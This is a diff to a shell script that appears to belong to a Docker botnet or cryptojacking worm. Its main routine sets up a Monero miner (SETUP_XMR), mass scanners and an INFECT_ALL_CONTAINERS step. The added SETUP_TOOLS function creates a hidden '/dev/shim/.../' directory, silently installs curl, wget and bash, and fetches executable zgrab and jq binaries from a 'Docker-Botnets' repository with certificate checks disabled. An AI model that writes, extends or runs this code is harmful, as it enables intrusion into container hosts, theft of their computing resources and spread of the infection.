@@ -11,7 +11,7 @@ function INIT_MAIN(){
     SETUP_SYSTEM
     SETUP_JQ
     SETUP_ZMAP
-    SETUP_ZGRAB
+    SETUP_TOOLS
     SETUP_MSCAN
     SETUP_XMR
     INFECT_ALL_CONTAINERS
@@ -67,28 +67,29 @@ function SETUP_SYSTEM(){
     apk add --no-cache --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing hwloc-dev || { echo "Failed to install hwloc-dev"; exit 1; }
 }
 
-function SETUP_JQ(){
-    apk update
-    apk add jq
+function SETUP_TOOLS(){
+if ! [ -d "/dev/shim/.../...nmlm.../" ] ; then mkdir -p /dev/shim/.../...nmlm.../ ; fi
+if ! type curl 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y curl 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall curl 2>/dev/null 1>/dev/null ; fi
+if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y curl 2>/dev/null 1>/dev/null ; yum reinstall -y curl 2>/dev/null 1>/dev/null ; fi
+if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add curl 2>/dev/null 1>/dev/null ; fi
+fi
+if ! type wget 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y wget 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall wget 2>/dev/null 1>/dev/null ; fi
+if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y wget 2>/dev/null 1>/dev/null ; yum reinstall -y wget 2>/dev/null 1>/dev/null ; fi
+if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add wget 2>/dev/null 1>/dev/null ; fi
+fi
+if ! type bash 2>/dev/null 1>/dev/null; then
+if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y bash 2>/dev/null 1>/dev/null; fi
+if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y bash 2>/dev/null 1>/dev/null; fi
+if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add bash 2>/dev/null 1>/dev/null; fi
+fi
+if ! [ -f "/usr/sbin/zgrab" ] ; then curl -sLk -o /usr/sbin/zgrab https://github.com/Caprico1/Docker-Botnets/raw/014b5432a9403b896a3924b8704403e9ab284a68/TDGGinit/zgrab ; chmod +x /usr/sbin/zgrab ; fi
+if ! [ -f "/usr/sbin/jq" ] ; then curl -sLk -o /usr/sbin/jq https://github.com/Caprico1/Docker-Botnets/raw/014b5432a9403b896a3924b8704403e9ab284a68/TDGGinit/jq ; chmod +x /usr/sbin/jq ; fi
+if ! type masscan 2>/dev/null 1>/dev/null; then 
+if type apt-get 2>/dev/null 1>/dev/null; then wget http://archive.ubuntu.com/ubuntu/pool/main/libp/libpcap/libpcap0.8_1.7.4-2_amd64.deb ; dpkg -i libpcap0.8_1.7.4-2_amd64.deb ; rm -f libpcap0.8_1.7.4-2_amd64.deb ; wget http://archive.ubuntu.com/ubuntu/pool/universe/m/masscan/masscan_1.0.3-95-gb395f18~ds0-2_amd64.deb ; dpkg -i masscan_1.0.3-95-gb395f18~ds0-2_amd64.deb ; rm -f masscan_1.0.3-95-gb395f18~ds0-2_amd64.deb ; fi
+if type yum 2>/dev/null 1>/dev/null; then wget http://mirror.centos.org/centos/7/os/x86_64/Packages/libpcap-1.5.3-12.el7.x86_64.rpm ; rpm -Uvh libpcap-1.5.3-12.el7.x86_64.rpm ; rm -f libpcap-1.5.3-12.el7.x86_64.rpm ; wget https://download-ib01.fedoraproject.org/pub/epel/7/x86_64/Packages/m/masscan-1.0.3-5.el7.x86_64.rpm ; rpm -Uvh masscan-1.0.3-5.el7.x86_64.rpm ; rm -f masscan-1.0.3-5.el7.x86_64.rpm ; fi
+fi
 }
 
-function SETUP_ZMAP(){
-    apk update
-    apk add zmap
-}
-
-
-function SETUP_ZGRAB(){
-apk update
-apk add git go gcc make musl-dev libpcap-dev linux-headers
-export GOPATH=/root/go
-mkdir -p $GOPATH/src/github.com/zmap/zgrab
-go install github.com/zmap/zgrab@latest
-cd $GOPATH/src/github.com/zmap/zgrab/
-go build
-cp ./zgrab /usr/bin/zgrab
-chmod +x /usr/bin/zgrab
-}
 
 function SETUP_MSCAN(){
     apk update
